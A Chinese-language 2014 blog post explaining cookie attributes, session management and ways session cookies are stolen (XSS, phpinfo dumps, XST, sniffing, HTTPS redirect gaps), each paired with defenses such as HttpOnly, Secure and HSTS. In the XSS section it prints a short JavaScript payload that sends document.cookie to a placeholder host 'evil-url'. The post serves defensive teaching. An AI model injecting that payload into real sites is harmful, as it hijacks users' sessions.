---
layout: post
title: "Cookie Theft and Session Hijacking"
date: 2014-08-16 10:22
comments: true
categories: tech
---

此篇文章的Presentation[戳这里](https://speakerdeck.com/shawn0102/cookie-theft-and-session-hijacking-1)。

## 一、cookie的基本特性

如果不了解cookie，可以先到[wikipedia](http://en.wikipedia.org/wiki/HTTP_cookie)上学习一下。

### http request

浏览器向服务器发起的每个请求都会带上cookie：

    GET /index.html HTTP/1.1
    Host: www.example.org
    Cookie: foo=value1;bar=value2
    Accept: */*

### http response

服务器给浏览器的返回可以设置cookie：

    HTTP/1.1 200 OK
    Content-type: text/html
    Set-Cookie: name=value
    Set-Cookie: name2=value2; Expires=Wed,09 June 2021 10:18:32 GMT

    (content of page)


## 二、cookie有关的术语

### session cookie

当cookie没有设置超时时间，那么cookie会在浏览器退出时销毁，这种cookie是session cookie。

### persistent cookie/tracking cookie

设置了超时时间的cookie，会在指定时间销毁，cookie的维持时间可以持续到浏览器退出之后，这种cookie被持久化在浏览器中。

很多站点用cookie跟踪用户的历史记录，例如广告类站点会使用cookie记录浏览过哪些内容，搜索引擎会使用cookie记录历史搜索记录，这时也可以称作tracking cookie，因为它被用于追踪用户行为。

### secure cookie

服务器端设置cookie的时候，可以指定`secure`属性，这时cookie只有通过https协议传输的时候才会带到网络请求中，不加密的http请求不会带有secure cookie。

设置secure cookie的方式举例：

    Set-Cookie: foo=bar; Path=/; Secure

### HttpOnly cookie

服务器端设置cookie的时候，也可以指定一个`HttpOnly`属性。

    Set-Cookie: foo=bar; Path=/; HttpOnly

设置了这个属性的cookie在javascript中无法获取到，只会在网络传输过程中带到服务器。

###third-party cookie

第三方cookie的使用场景通常是iframe，例如www.a.com潜入了一个www.ad.com的广告iframe，那么www.ad.com设置的cookie属于不属于www.a.com，被称作第三方cookie。

### supercookie

cookie会从属于一个域名，例如www.a.com，或者属于一个子域，例如b.a.com。但是如果cookie被声明为属于.com会发生什么？这个cookie会在任何.com域名生效。这有很大的安全性问题。这种cookie被称作supercookie。

浏览器做出了限制，不允许设置顶级域名cookie(例如.com，.net)和pubic suffix cookie(例如.co.uk，.com.cn)。

现代主流浏览器都很好的处理了supercookie问题，但是如果有些第三方浏览器使用的顶级域名和public suffix列表有问题，那么就可以针对supercookie进行攻击啦。

### zombie cookie/evercookie

僵尸cookie是指当用户通过浏览器的设置清除cookie后可以自动重新创建的cookie。原理是通过使用多重技术记录同样的内容(例如flash，silverlight)，当cookie被删除时，从其他存储中恢复。

evercookie是实现僵尸cookie的主要技术手段。

了解[僵尸cookie](http://en.wikipedia.org/wiki/Zombie_cookie)和[evercookie](http://en.wikipedia.org/wiki/Evercookie)。

## 三、cookie有什么用

通常cookie有三种主要的用途。

### session管理

http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是[Base Auth](http://en.wikipedia.org/wiki/Basic_access_authentication)，但是这种方式，用户名和密码在每次请求中都会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。

所以现在大多数站点采用基于cookie的session管理方式：

用户登陆成功后，设置一个唯一的cookie标识本次会话，基于这个标识进行用户授权。只要请求中带有这个标识，都认为是登录态。

### 个性化

cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。

以前Google退出的iGoogle产品也是一个典型的例子，用户可以拥有自己的Google自定制主页，其中就使用了cookie。

### user tracking

cookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。

## 四、cookie窃取和session劫持

本文就cookie的三种用途中session管理的安全问题进行展开。

既然cookie用于维持会话，如果这个cookie被攻击者窃取会发生什么？session被劫持！

攻击者劫持会话就等于合法登录了你的账户，可以浏览大部分用户资源。

![](/assets/img/post_session_hijacking.jpg)

### 最基本的cookie窃取方式：xss漏洞

__攻击__

一旦站点中存在可利用的xss漏洞，攻击者可直接利用注入的js脚本获取cookie，进而通过异步请求把标识session id的cookie上报给攻击者。

    var img = document.createElement('img');
    img.src = 'http://evil-url?c=' + encodeURIComponent(document.cookie);
    document.getElementsByTagName('body')[0].appendChild(img);
    
如何寻找XSS漏洞是另外一个话题了，自行google之。
    
__防御__

根据上面`HttpOnly cookie`的介绍，一旦一个cookie被设置为`HttpOnly`，js脚本就无法再获取到，而网络传输时依然会带上。也就是说依然可以依靠这个cookie进行session维持，但客户端js对其不可见。那么即使存在xss漏洞也无法简单的利用其进行session劫持攻击了。

但是上面说的是无法利用xss进行简单的攻击，但是也不是没有办法的。既然无法使用`document.cookie`获取到，可以转而通过其他的方式。下面介绍两种xss结合其他漏洞的攻击方式。

### xss结合phpinfo页面

__攻击__

大家都知道，利用php开发的应用会有一个phpinfo页面。而这个页面会dump出请求信息，其中就包括cookie信息。

![](/assets/img/post_session_hijacking_phpinfo.png)

如果开发者没有关闭这个页面，就可以利用xss漏洞向这个页面发起异步请求，获取到页面内容后parse出cookie信息，然后上传给攻击者。

phpinfo只是大家最常见的一种dump请求的页面，但不仅限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。
 
__防御__

关闭所有phpinfo类dump request信息的页面。

### XSS + HTTP TRACE = XST

这是一种古老的攻击方式，现在已经消失，写在这里可以扩展一下攻防思路。

http trace是让我们的web服务器将客户端的所有请求信息返回给客户端的方法。其中包含了HttpOnly的cookie。如果利用xss异步发起trace请求，又可以获取session信息了。

之所以说是一种古老的攻击方式，因为现代浏览器考虑到XST的危害都禁止了异步发起trace请求。

另外提一点，当浏览器没有禁止异步发起trace的时代，很多开发者都关闭了web server的trace支持来防御XST攻击。但攻击者在特定的情况下还可以绕过，用户使用了代理服务器，而代理服务器没有关闭trace支持，这样又可以trace了。

### 网络监听(network eavesdropping/network sniffing)

以上是利用上层应用的特性的几种攻击方式，cookie不仅存在于上层应用中，更流转于请求中。上层应用获取不到后，攻击者可以转而从网络请求中获取。

只要是未使用https加密的网站都可以抓包分析，其中就包含了标识session的cookie。当然，完成网络监听需要满足一定的条件，这又是另外一个话题了。常见的方式：

* DNS缓存投毒
   
   攻击者把要攻击的域名的一个子域映射到攻击者的server，然后想办法让被攻击者访问这个server(XSS request、社会化攻击等)，请求中会带过来所有cookie（包括HttpOnly）。

* 中间人攻击
   
   常见的攻击方式是搭建免费wifi，把DHCP服务器指定为攻击者ip，在攻击者机器上可以收到所有请求，不仅可以获取cookie，还可以进行脚本注入。

* 代理服务器/VPN

   翻墙用免费VPN？呵呵。
   
__防御__

使用https。使用https协议的请求都被ssl加密，理论上不可破解，即便被网络监听也无法通过解密看到实际的内容。

防御网络监听通常有两种方式：

* 信道加密
* 内容加密

https是加密信道，在此信道上传输的内容对中间人都是不可见的。但https是有成本的。

内容加密比较好理解，例如对password先加密再传输。但是对于标识session的cookie这种**标识性信息**是无法通过内容加密得到保护的。

那么，使用https的站点就可以高枕无忧了吗？事实上，一些细节上的处理不当同样会暴露出攻击风险。

### https站点攻击：双协议

如果同时支持http和https，那么还是可以使用网络监听http请求获取cookie。

__防御__

只支持https，不支持http。

这样就好了吗？No.

### https站点攻击：301重定向

例如www.example.com只支持https协议，当用户直接输入example.com（大部分用户都不会手动输入协议前缀），web server通常的处理是返回301要求浏览器重定向到https://www.example.com。这次301请求是http的！而且带了cookie，这样又将cookie明文暴露在网络上了。

__防御1__

把标识session的cookie设置成secure。上面提到的secure cookie，只允许在https上加密传输，在http请求中不会存在，这样就不会暴露在未加密的网络上了。

然后现实很残酷，很多站点根本无法做到所有的请求都走https。原因有很多，可能是成本考虑，可能是业务需求。

__防御2__

设置`Strict-Transport-Security header`，直接省略这个http请求！用户首次访问后，服务器设置了这个header以后，后面就会省略掉这次http 301请求。更多[点此](https://www.owasp.org/index.php/HTTP_Strict_Transport_Security)

[乌云案例](http://www.wooyun.org/bugs/wooyun-2010-049877/auth/36b625b1c47b40b270c6a390a0fb9525)

## 思考

如果偷取cookie失败，无法session劫持，攻击者如何再发起攻击？

劫持session的目的是拿到登录态，从而获得服务器授权做很多请求，例如账户变更。如果劫持不到session，也能够做授权请求不是也达到攻击的目的了？

无需拿到session cookie，跨站发起请求就可以了，这就是CSRF！

server通过把用户凭证存储在cookie以维持session，http/https协议每次访问都会自动传输cookie，协议上的缺陷是导致可进行CSRF攻击的根本原因！

防御方式：使用anti-forgery token

> 大部分攻击都是提权行为，最基本的提权通过偷取用户名密码，不成功转而窃取session，窃取不成转而跨站攻击，实在不行重放也可以造成危害



